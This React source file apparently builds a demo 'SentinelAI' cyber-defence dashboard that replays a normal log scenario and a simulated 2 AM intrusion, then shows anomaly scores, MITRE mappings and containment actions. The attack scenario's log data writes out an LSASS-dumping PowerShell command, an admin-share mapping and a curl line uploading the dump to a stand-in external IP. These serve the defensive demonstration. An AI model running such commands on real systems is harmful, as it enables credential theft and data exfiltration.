import React, { useState } from 'react';
import PipelineFlow from './components/PipelineFlow';
import IncidentFeed from './components/IncidentFeed';
import AuditReport from './components/AuditReport';
import { 
  ShieldAlert, 
  Play, 
  Activity, 
  Lock, 
  Server 
} from 'lucide-react';

const SCENARIOS = {
  Standard_Corporate_Activity: [
    {
      timestamp: "2026-07-18T09:00:00Z",
      source_system: "ActiveDirectory-DomainController",
      event_id: 4624,
      user_id: "operator_01",
      source_ip: "10.0.1.25",
      destination_ip: "10.0.1.1",
      process_name: "lsass.exe",
      command_line: null,
      description: "Successful user logon using Kerberos protocol during standard shift hours."
    },
    {
      timestamp: "2026-07-18T11:15:30Z",
      source_system: "Workstation-Office-B",
      event_id: 4688,
      user_id: "analyst_beta",
      source_ip: "10.0.2.14",
      destination_ip: null,
      process_name: "outlook.exe",
      command_line: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
      description: "Standard application startup by authenticated corporate user."
    },
    {
      timestamp: "2026-07-18T14:45:00Z",
      source_system: "Internal-File-Share",
      event_id: 5140,
      user_id: "operator_01",
      source_ip: "10.0.1.25",
      destination_ip: "10.0.10.5",
      process_name: null,
      command_line: null,
      description: "A network share object was accessed by authenticated workstation."
    }
  ],
  APT_Credential_Exfiltration_2AM: [
    {
      timestamp: "2026-07-18T02:00:00Z",
      source_system: "External-Gateway-VPN",
      event_id: 4624,
      user_id: "Administrator",
      source_ip: "198.51.100.72",
      destination_ip: "10.0.5.10",
      process_name: "sshd.exe",
      command_line: null,
      description: "Administrative account login established from external rogue public IP address."
    },
    {
      timestamp: "2026-07-18T02:05:00Z",
      source_system: "DomainController-Primary",
      event_id: 4688,
      user_id: "Administrator",
      source_ip: "10.0.5.10",
      destination_ip: null,
      process_name: "powershell.exe",
      command_line: "powershell.exe -ExecutionPolicy Bypass -File dump_lsass.ps1",
      description: "PowerShell command executed with bypass constraints executing LSASS memory dumper script."
    },
    {
      timestamp: "2026-07-18T02:10:00Z",
      source_system: "Database-Server-CNI",
      event_id: 5038,
      user_id: "Administrator",
      source_ip: "10.0.5.10",
      destination_ip: "10.0.5.50",
      process_name: "cmd.exe",
      command_line: "net use \\\\10.0.5.50\\C$ /user:Administrator",
      description: "Lateral movement attempt utilizing administrative credentials to map database server filesystem."
    },
    {
      timestamp: "2026-07-18T02:15:00Z",
      source_system: "Database-Server-CNI",
      event_id: null,
      user_id: "Administrator",
      source_ip: "10.0.5.50",
      destination_ip: "203.0.113.88",
      process_name: "curl.exe",
      command_line: "curl -F file=@lsass_dump.dmp http://203.0.113.88/upload",
      description: "Outbound connection spike detected transmitting large memory dump files to foreign server."
    }
  ]
};

export default function App() {
  const [executionState, setExecutionState] = useState('idle');
  const [activeStep, setActiveStep] = useState(0);
  const [activeScenario, setActiveScenario] = useState(null);
  const [stateData, setStateData] = useState({
    raw_logs: [],
    anomaly_score: 0.0,
    is_threat_detected: false,
    mitre_mappings: [],
    predicted_next_moves: [],
    remediation_actions: [],
    audit_trail: [],
    final_executive_summary: ''
  });

  const runSimulation = async (scenarioName) => {
    setActiveScenario(scenarioName);
    setExecutionState('processing');
    setActiveStep(0);

    const logs = SCENARIOS[scenarioName];

    setStateData({
      raw_logs: logs,
      anomaly_score: 0.0,
      is_threat_detected: false,
      mitre_mappings: [],
      predicted_next_moves: [],
      remediation_actions: [],
      audit_trail: [],
      final_executive_summary: ''
    });

    try {
      const delay = (ms) => new Promise(res => setTimeout(res, ms));

      const response = await fetch('http://127.0.0.1:8000/api/analyze-telemetry', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          scenario_name: scenarioName,
          logs: logs
        })
      });

      if (response.ok) {
        const result = await response.json();

        for (let step = 0; step < 5; step++) {
          setActiveStep(step);
          await delay(600);
        }

        setStateData(result);
        setExecutionState('complete');
      } else {
        throw new Error('Backend response not OK');
      }
    } catch (err) {
      console.warn('Backend endpoint unreachable. Operating in local replay mode.', err);
      simulateClientSideFlow(scenarioName, logs);
    }
  };

  const simulateClientSideFlow = async (scenarioName, logs) => {
    const delay = (ms) => new Promise(res => setTimeout(res, ms));

    const isAttack = scenarioName === 'APT_Credential_Exfiltration_2AM';

    setActiveStep(0);
    await delay(700);
    const bhState = {
      anomaly_score: isAttack ? 1.0 : 0.28,
      is_threat_detected: isAttack,
      audit_trail: [
        {
          agent_name: "Behavioral Anomaly Engine",
          timestamp: new Date().toISOString(),
          action_taken: isAttack ? "FLAGGED_THREAT_ANOMALY" : "PASS_NORMAL_TELEMETRY",
          confidence_score: isAttack ? 1.0 : 0.71,
          reasoning_explanation: isAttack 
            ? "Anomalous system behavior detected. Outlier features found in 4 logs executed at 2:00 AM." 
            : "All telemetry logs align within expected business hours and benign operational feature boundaries."
        }
      ]
    };

    setActiveStep(1);
    await delay(700);
    const mitre = isAttack ? [
      { technique_id: "T1003", tactic_name: "Credential Access", severity: "CRITICAL", summary: "PowerShell process dumping LSASS memory for credential harvesting." },
      { technique_id: "T1021", tactic_name: "Lateral Movement", severity: "HIGH", summary: "Unauthorized mapping of administrative database shares." },
      { technique_id: "T1048", tactic_name: "Exfiltration", severity: "CRITICAL", summary: "High-volume outbound POST connection spike targeting foreign server." }
    ] : [];

    setActiveStep(2);
    await delay(700);
    const pred = isAttack ? [
      { target_node: "External Command & Control Server", predicted_technique: "T1048 (Exfiltration Over Alternative Protocol)", likelihood: 0.95, justification: "Threat actor mapped administrative database layers. Imminent exfiltration expected." }
    ] : [];

    setActiveStep(3);
    await delay(700);
    const soar = isAttack ? [
      { action: "BLOCK_IP: 198.51.100.72", status: "EXECUTED", timestamp: new Date().toISOString() },
      { action: "ISOLATE_HOST: Database-Server-CNI", status: "EXECUTED", timestamp: new Date().toISOString() },
      { action: "ISOLATE_HOST: External-Gateway-VPN", status: "EXECUTED", timestamp: new Date().toISOString() }
    ] : [];

    setActiveStep(4);
    await delay(700);
    const summary = isAttack ? `# SentinelAI Executive Security Brief
Generated: ${new Date().toISOString()}

## 1. System Security Index
* **Security Status:** CRITICAL THREAT DETECTED
* **Global Anomaly Score:** 100.0%
* **Active Isolation Alerts:** 3

---

## 2. Telemetry Threat Evaluation & MITRE ATT&CK Mappings
- **[T1003] Credential Access** (Severity: CRITICAL)
  *Detail:* PowerShell process dumping LSASS memory for credential harvesting.
- **[T1021] Lateral Movement** (Severity: HIGH)
  *Detail:* Unauthorized mapping of administrative database shares.
- **[T1048] Exfiltration** (Severity: CRITICAL)
  *Detail:* High-volume outbound POST connection spike targeting foreign server.

---

## 3. Attack Chain Path Predictions
- **Target Node:** External Command & Control Server -> T1048 (Exfiltration Over Alternative Protocol) (Likelihood: 95%)

---

## 4. Autonomous SOAR Response Containment Actions
- [EXECUTED] BLOCK_IP: 198.51.100.72
- [EXECUTED] ISOLATE_HOST: Database-Server-CNI
- [EXECUTED] ISOLATE_HOST: External-Gateway-VPN
` : `# SentinelAI Executive Security Brief
Generated: ${new Date().toISOString()}

## 1. System Security Index
* **Security Status:** SYSTEM STABLE & SAFE
* **Global Anomaly Score:** 28.0%
* **Active Isolation Alerts:** 0

All telemetry logs align within expected business hours and benign operational feature boundaries.
`;

    setStateData({
      raw_logs: logs,
      anomaly_score: bhState.anomaly_score,
      is_threat_detected: isAttack,
      mitre_mappings: mitre,
      predicted_next_moves: pred,
      remediation_actions: soar,
      audit_trail: bhState.audit_trail,
      final_executive_summary: summary
    });

    setExecutionState('complete');
  };

  const getThreatIndexLabel = () => {
    if (executionState === 'idle') return { label: 'LOW / NOMINAL', color: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' };
    if (!stateData.is_threat_detected) return { label: 'LOW / BENIGN', color: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' };
    return { label: 'CRITICAL / APT THREAT', color: 'bg-red-500/20 text-red-400 border-red-500/40 animate-pulse' };
  };

  const threatIndex = getThreatIndexLabel();

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-sans p-4 md:p-6 flex flex-col gap-5">
      <header className="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 md:px-6 shadow-2xl backdrop-blur-lg flex flex-col lg:flex-row items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="p-2.5 rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 shadow-lg shadow-indigo-500/20">
            <ShieldAlert className="w-6 h-6 text-white" />
          </div>
          <div>
            <h1 className="text-xl font-black tracking-tight text-white flex items-center gap-2">
              SENTINEL<span className="text-indigo-400">AI</span>
              <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-indigo-500/20 text-indigo-300 border border-indigo-500/30 uppercase tracking-widest">
                CNI Defense v2.0
              </span>
            </h1>
            <p className="text-xs text-slate-400">Autonomous Multi-Agent Cyber Defense Orchestration Platform</p>
          </div>
        </div>

        <div className="flex items-center gap-3 flex-wrap justify-center">
          <div className="px-3.5 py-2 rounded-xl bg-slate-950/60 border border-slate-800/80 flex items-center gap-2.5">
            <Server className="w-4 h-4 text-slate-400" />
            <div>
              <div className="text-[10px] uppercase text-slate-500 font-bold">System Health</div>
              <div className="text-xs font-bold text-emerald-400">ONLINE (99.9%)</div>
            </div>
          </div>

          <div className="px-3.5 py-2 rounded-xl bg-slate-950/60 border border-slate-800/80 flex items-center gap-2.5">
            <Lock className="w-4 h-4 text-amber-400" />
            <div>
              <div className="text-[10px] uppercase text-slate-500 font-bold">Active Isolation Alerts</div>
              <div className="text-xs font-bold text-amber-300">
                {stateData.remediation_actions ? stateData.remediation_actions.length : 0} Actions
              </div>
            </div>
          </div>

          <div className="px-3.5 py-2 rounded-xl bg-slate-950/60 border border-slate-800/80 flex items-center gap-2.5">
            <Activity className="w-4 h-4 text-indigo-400" />
            <div>
              <div className="text-[10px] uppercase text-slate-500 font-bold">Infrastructure Threat Index</div>
              <div className={`text-xs font-bold px-2 py-0.5 rounded border mt-0.5 ${threatIndex.color}`}>
                {threatIndex.label}
              </div>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-2.5">
          <button
            onClick={() => runSimulation('Standard_Corporate_Activity')}
            disabled={executionState === 'processing'}
            className="flex items-center gap-2 px-4 py-2.5 rounded-xl bg-emerald-600/20 hover:bg-emerald-600/30 text-emerald-300 border border-emerald-500/40 text-xs font-bold transition-all disabled:opacity-50 shadow-lg shadow-emerald-950/50 cursor-pointer"
          >
            <Play className="w-3.5 h-3.5 fill-current" />
            Run Normal Activity Profile
          </button>

          <button
            onClick={() => runSimulation('APT_Credential_Exfiltration_2AM')}
            disabled={executionState === 'processing'}
            className="flex items-center gap-2 px-4 py-2.5 rounded-xl bg-red-600/20 hover:bg-red-600/30 text-red-300 border border-red-500/40 text-xs font-bold transition-all disabled:opacity-50 shadow-lg shadow-red-950/50 animate-pulse cursor-pointer"
          >
            <ShieldAlert className="w-3.5 h-3.5" />
            Execute 2:00 AM Attack Infiltration Simulation
          </button>
        </div>
      </header>

      <main className="grid grid-cols-1 lg:grid-cols-12 gap-5 flex-1 min-h-[640px]">
        <div className="lg:col-span-3">
          <PipelineFlow 
            executionState={executionState}
            activeStep={activeStep}
            stateData={stateData}
          />
        </div>

        <div className="lg:col-span-5">
          <IncidentFeed 
            logs={stateData.raw_logs}
            mitreMappings={stateData.mitre_mappings}
            isThreatDetected={stateData.is_threat_detected}
          />
        </div>

        <div className="lg:col-span-4">
          <AuditReport 
            summary={stateData.final_executive_summary}
            auditTrail={stateData.audit_trail}
          />
        </div>
      </main>
    </div>
  );
}
